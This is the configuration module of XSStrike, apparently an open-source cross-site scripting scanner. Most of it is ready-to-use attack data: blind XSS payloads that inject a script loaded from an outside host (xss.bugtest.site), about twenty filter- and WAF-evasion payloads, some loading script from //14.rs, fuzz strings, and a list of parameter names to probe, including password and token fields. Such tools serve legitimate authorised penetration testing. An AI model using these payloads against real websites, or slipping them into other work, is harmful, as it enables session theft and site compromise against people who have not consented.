"""
XSStrike Configuration Module

This module provides configuration values for XSStrike, now with support for 
configuration files while maintaining backward compatibility.
"""

from core.config_manager import config_manager

# Initialize configuration from files
try:
    config_manager.load_config()
except SystemExit:
    # If config loading fails, fall back to hardcoded values for compatibility
    pass

# Legacy configuration variables (for backward compatibility)
changes = """Negligible DOM XSS false positives;x10 faster crawling"""
globalVariables = {}  # holds variables during runtime for collaboration across modules

# Configuration values with fallbacks to hardcoded defaults
defaultEditor = config_manager.get("logging.default_editor", "nano")
blindPayload = config_manager.get("blind_payload", '"><script src="https://xss.bugtest.site"></script>')
xsschecker = config_manager.get("xss_checker", "v3dm0s")

# Additional blind XSS payload variations
blindPayloads = config_manager.get("blind_payloads", [
    '"><script src="https://xss.bugtest.site"></script>',
    "'><script src='https://xss.bugtest.site'></script>",
    '</script><script src="https://xss.bugtest.site"></script>',
    '<script src="https://xss.bugtest.site"></script>',
    'javascript:eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'https://xss.bugtest.site\\\';document.head.appendChild(a)\')',
    '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'https://xss.bugtest.site\';document.head.appendChild(s)">',
])

# Network configuration
proxies = config_manager.get("network.proxies", {
    "http": "http://0.0.0.0:8080",
    "https": "http://0.0.0.0:8080"
})

delay = config_manager.get("network.delay", 0)
threadCount = config_manager.get("network.thread_count", 10)
timeout = config_manager.get("network.timeout", 10)

# SSL Configuration
verify_ssl = config_manager.get("network.verify_ssl", False)
ssl_cert_path = config_manager.get("network.ssl_cert_path", None)

# Scanning configuration
minEfficiency = config_manager.get("scanning.min_efficiency", 90)
specialAttributes = config_manager.get("scanning.special_attributes", ["srcdoc", "src"])
badTags = tuple(config_manager.get("scanning.bad_tags",
                                   ["iframe", "title", "textarea", "noembed", "style", "template", "noscript"]))
tags = tuple(config_manager.get("scanning.tags", ["html", "d3v", "a", "details"]))

jFillings = config_manager.get("scanning.js_fillings", ";")
lFillings = tuple(config_manager.get("scanning.l_fillings", ["", "%0dx"]))
eFillings = tuple(config_manager.get("scanning.e_fillings", ["%09", "%0a", "%0d", "+"]))
fillings = tuple(config_manager.get("scanning.fillings", ["%09", "%0a", "%0d", "/+/"]))

# Event handlers
eventHandlers = config_manager.get("event_handlers", {
    "ontoggle": ["details"],
    "onpointerenter": ["d3v", "details", "html", "a"],
    "onmouseover": ["a", "html", "d3v"],
})

# JavaScript functions
functions = tuple(config_manager.get("javascript_functions", [
    "[8].find(confirm)",
    "confirm()",
    "(confirm)()",
    "co\u006efir\u006d()",
    "(prompt)``",
    "a=prompt,a()",
]))

# Payloads for filter & WAF evasion
payloads = tuple(config_manager.get("payloads", [
    "'\"</Script><Html Onmouseover=(confirm)()//",
    "<imG/sRc=l oNerrOr=(prompt)() x>",
    "<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>",
    "<deTails open oNToggle=confi\u0072m()>",
    "<img sRc=l oNerrOr=(confirm)() x>",
    '<svg/x=">"/onload=confirm()//',
    "<svg%0Aonload=%09((pro\u006dpt))()//",
    "<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>",
    "<sCript x>confirm``</scRipt x>",
    "<Script x>prompt()</scRiPt x>",
    "<sCriPt sRc=//14.rs>",
    "<embed//sRc=//14.rs>",
    "<base href=//14.rs/><script src=/>",
    "<object//data=//14.rs>",
    '<s=" onclick=confirm``>clickme',
    "<svG oNLoad=co\u006efirm&#x28;1&#x29>",
    "'\"><y///oNMousEDown=((confirm))()>Click",
    "<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>",
    "<img src=x onerror=confir\u006d`1`>",
    "<svg/onload=co\u006efir\u006d`1`>",
]))

# Fuzz strings
fuzzes = tuple(config_manager.get("fuzzes", [
    "<test",
    "<test//",
    "<test>",
    "<test x>",
    "<test x=y",
    "<test x=y//",
    "<test/oNxX=yYy//",
    "<test oNxX=yYy>",
    "<test onload=x",
    "<test/o%00nload=x",
    "<test sRc=xxx",
    "<test data=asa",
    "<test data=javascript:asa",
    "<svg x=y>",
    "<details x=y//",
    "<a href=x//",
    "<emBed x=y>",
    "<object x=y//",
    "<bGsOund sRc=x>",
    "<iSinDEx x=y//",
    "<aUdio x=y>",
    "<script x=y>",
    "<script//src=//",
    '">payload<br/attr="',
    '"-confirm``-"',
    "<test ONdBlcLicK=x>",
    "<test/oNcoNTeXtMenU=x>",
    "<test OndRAgOvEr=x>",
]))

# Default headers
headers = config_manager.get("headers", {
    "User-Agent": "$",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip,deflate",
    "Connection": "close",
    "DNT": "1",
    "Upgrade-Insecure-Requests": "1",
})

# Parameter names for blind testing
blindParams = config_manager.get("blind_params", [
    "redirect", "redir", "url", "link", "goto", "debug", "_debug", "test",
    "get", "index", "src", "source", "file", "frame", "config", "new", "old",
    "var", "rurl", "return_to", "_return", "returl", "last", "text", "load",
    "email", "mail", "user", "username", "password", "pass", "passwd",
    "first_name", "last_name", "back", "href", "ref", "data", "input", "out",
    "net", "host", "address", "code", "auth", "userid", "auth_token", "token",
    "error", "keyword", "key", "q", "query", "aid", "bid", "cid", "did", "eid",
    "fid", "gid", "hid", "iid", "jid", "kid", "lid", "mid", "nid", "oid",
    "pid", "qid", "rid", "sid", "tid", "uid", "vid", "wid", "xid", "yid",
    "zid", "cal", "country", "x", "y", "topic", "title", "head", "higher",
    "lower", "width", "height", "add", "result", "log", "demo", "example",
    "message"
])


def update_config_from_args(args):
    """
    Update configuration values from command-line arguments.
    
    Args:
        args: Parsed command-line arguments
    """
    global delay, threadCount, timeout, verify_ssl, ssl_cert_path, blindPayload

    if hasattr(args, 'delay') and args.delay is not None:
        delay = args.delay
        config_manager.set("network.delay", delay)

    if hasattr(args, 'threadCount') and args.threadCount is not None:
        threadCount = args.threadCount
        config_manager.set("network.thread_count", threadCount)

    if hasattr(args, 'timeout') and args.timeout is not None:
        timeout = args.timeout
        config_manager.set("network.timeout", timeout)

    if hasattr(args, 'verify_ssl') and args.verify_ssl:
        verify_ssl = True
        config_manager.set("network.verify_ssl", verify_ssl)

    if hasattr(args, 'ssl_cert_path') and args.ssl_cert_path:
        ssl_cert_path = args.ssl_cert_path
        config_manager.set("network.ssl_cert_path", ssl_cert_path)

    if hasattr(args, 'blind_payload') and args.blind_payload:
        blindPayload = args.blind_payload
        config_manager.set("blind_payload", blindPayload)
